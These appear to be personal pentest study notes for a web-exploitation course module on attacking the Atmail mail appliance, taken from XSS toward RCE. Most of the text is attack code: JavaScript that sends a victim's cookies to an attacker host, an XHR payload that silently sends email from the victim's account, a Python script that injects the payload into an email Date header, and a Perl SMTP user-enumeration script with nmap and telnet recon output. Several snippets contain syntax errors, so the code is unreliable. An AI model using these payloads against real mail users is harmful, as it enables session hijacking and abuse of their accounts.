# WEB-300: Atmail eMail Server Appliance: from XSS to RCE
The idea is mailservers can be vulnerable to xss, if you send a payload in the date or subject or body as form of iframe or javascript, you canexploit the vulnerability. Note: 99% of the world use about 4 main mail platforms, with gmail and outlook and yahoo basically accounting for over 90% and protonmail 8%. So, everything explained here is mostly theoretical. All mail servers won't accept iframe and the fields are sanitized. So, the only trick you have is still to trick people out of the mail through links. 

# session hijacking
```javascript
function addImage(){
  var img = document.createElement('img');
  img.src = "http://attacker-ip:port/"+document.cookie;
  document.body.appendChild(img);
}

addImage();
```

# session riding
For this attack let's use XMLHttpRequest. The XHR objects are used to interact with servers. You can retrieve data from a URL without having to do a full page refresh.
- with burp find which is the request to send out emails 
### payload to send email using XMLHttpRequest
The person won't notice of emails sent from their account.
```javascript
var email = attacker@mail.com;
var sub = "whatever";
var msg = "okayyyy";
var method = "GET";
function send_email(){
  var uri = "/index.php/mail/composemessage/send/tabId/"
  var para = "?mailTo="+email+"&emailSubject="+sub+"&emailBody="+msg;
  xhr = new XMLHttpRequests();
  xhr.open(method,uri+para, true);
  xhr.send(null);
}
```
## sending the payload
```python
import smtplib

def sendEmail(to,from,smtpsrv,payload):
  msg = 'From: attacker@mail.com\n'
  msg += To: victim@mail.com\n'
  msg += f'Date: {payload}\n'
  msg += 'Subject: pwnd\n'
  msg += 'Content-type: text/html\n\n'
  msg += 'something something something'
  msg += '\r\n\r\n'

  server = smtplib.SMTP(smtpsrv)
  try:
    server.sendmail(to, from, msg)
  except:
    pass
  server.quit()
```

## References:
- [Hacking SMTP Servers](https://medium.com/@minimalist.ascent/hacking-smtp-ser-2b8a5cc1ce47)
- 
## other informations
Scan host and verify whether or not the SMTP is actually running we can connect to it via telnet and issue a few commands. After that, enumerate possible users base on OSINT research on Linkedin. 
```bash
root@asus:/mnt% nmap -sV -T4 -p22,25 mail.acme.comStarting Nmap 7.01 ( https://nmap.org ) at 2018-12-28 19:39 MST
Nmap scan report for mail.acme.com
Host is up (0.00097s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
25/tcp open  smtp    Sendmail 8.15.2/8.15.2/Debian-8
MAC Address: 08:00:27:0C:B6:CC (Oracle VirtualBox virtual NIC)
Service Info: Host: debian9.acme.com; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.63 seconds
root@asus:/mnt%


root@asus:~/pentest_notes% telnet mail.acme.com 25
Trying mail.acme.com...
Connected to mail.acme.com.
Escape character is '^]'.
220 mail.acme.com ESMTP Sendmail 8.15.2/8.15.2/Debian-8; Fri, 28 Dec 2018 19:31:58 -0700;
HELO mail.acme.com
250 mail.acme.com Hello [77.x.x.x], pleased to meet you
quit
221 2.0.0 mail.acme.com closing connection
Connection closed by foreign host.
root@asus:~/pentest_notes%
```
#### Verify a user exists
```
----- SNIP -----
#!/usr/bin/env perl
use strict;
use warnings;use Net::SMTP;open(my $fh, '<', 'users.txt') or die $!;my @users;
while (<$fh>) {
    chomp($_);
    push(@users, $_);
}close($fh) or die $!;my $s = Net::SMTP->new('mail.acme.com');for my $user (0..$#users) { 
    print "$users[$user] user exists\n" if ($s->verify($users[$user]));
    sleep(1);
}
$s->quit; 
----- SNIP -----
```
